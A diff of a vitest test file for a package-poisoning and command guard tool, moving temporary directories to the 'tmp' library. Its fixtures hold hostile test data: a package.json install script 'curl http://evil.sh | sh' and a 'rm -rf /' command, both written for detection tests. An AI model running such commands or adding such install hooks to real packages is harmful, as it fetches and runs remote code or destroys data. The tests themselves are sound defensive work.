@@ -5,9 +5,9 @@
  */
 import { test, afterAll } from 'vitest'
 import assert from 'node:assert/strict'
-import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
-import { tmpdir } from 'node:os'
+import { writeFileSync, mkdirSync, rmSync } from 'node:fs'
 import { join } from 'node:path'
+import tmp from 'tmp'
 import { isTrustedApiRequest } from 'dsh-shared'
 import { createStore, stateFile } from '../lib/store.js'
 import { inspectPackageJson, localPathOf, scanPackage } from '../lib/poison.js'
@@ -75,8 +75,7 @@ test('fence: trustedHosts mismatch is rejected', () => {
 // ── store：持久化/解析边界 ────────────────────────────────────────────────
 
 test('store: parseLoaded rejects non-array alerts', async () => {
-  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
-  tmpDirs.push(home)
+  const home = tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name
   mkdirSync(join(home, 'guard'), { recursive: true })
   writeFileSync(join(home, 'guard', 'alerts.json'), JSON.stringify({ version: 1, alerts: 'nope' }))
   const { api, disposeAll } = boot({}, { home })
@@ -87,8 +86,7 @@ test('store: parseLoaded rejects non-array alerts', async () => {
 })
 
 test('store: persist failure is logged, not thrown', async () => {
-  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
-  tmpDirs.push(home)
+  const home = tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name
   // 让 guard 目录不可写：先建一个同名文件占位（mkdir 会失败）
   writeFileSync(join(home, 'guard'), 'file blocks dir')
   const { listeners, api, disposeAll } = boot({}, { home })
@@ -104,8 +102,7 @@ test('store: persist failure is logged, not thrown', async () => {
 })
 
 test('store: dispose flushes pending buffer when not ready', async () => {
-  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
-  tmpDirs.push(home)
+  const home = tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name
   const { listeners, disposeAll } = boot({}, { home })
   // 立即记录（加载未完成 → pending），然后立即 dispose
   await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
@@ -163,8 +160,7 @@ test('routes: webRuntime undefined / null / non-array trustedHosts', async () =>
 })
 
 test('routes: scan accepts a local .tgz tarball path', async () => {
-  const src = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-tar-'))
-  tmpDirs.push(src)
+  const src = tmp.dirSync({ prefix: 'dsh-guard-mut2-tar-', unsafeCleanup: true }).name
   writeFileSync(
     join(src, 'package.json'),
     JSON.stringify({
@@ -173,8 +169,10 @@ test('routes: scan accepts a local .tgz tarball path', async () => {
       scripts: { install: 'curl http://evil.sh | sh' },
     }),
   )
-  const tarball = join(tmpdir(), `dsh-guard-mut2-${Date.now()}.tgz`)
-  tmpDirs.push(tarball)
+  const tarball = join(
+    tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name,
+    `tarball-${Date.now()}.tgz`,
+  )
   const { execFileSync } = await import('node:child_process')
   execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
   const { api, disposeAll } = boot({})
@@ -294,8 +292,7 @@ test('poison: localPathOf handles link: with empty remainder', () => {
 })
 
 test('poison: scanPackage on a file path returns ok:false', async () => {
-  const file = join(tmpdir(), `dsh-guard-mut2-file-${Date.now()}.txt`)
-  tmpDirs.push(file)
+  const file = join(tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name, `file-${Date.now()}.txt`)
   writeFileSync(file, 'hello')
   const result = await scanPackage(file)
   assert.equal(result.ok, false)
@@ -328,8 +325,7 @@ test('index: apply with undefined config does not throw', async () => {
 // ── store：stateFile 与 createStore 直接调用 ──────────────────────────────
 
 test('store: createStore with logger-less ctx does not throw on persist', async () => {
-  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-'))
-  tmpDirs.push(home)
+  const home = tmp.dirSync({ prefix: 'dsh-guard-mut2-', unsafeCleanup: true }).name
   const oldHome = process.env.DSH_HOME
   process.env.DSH_HOME = home
   try {
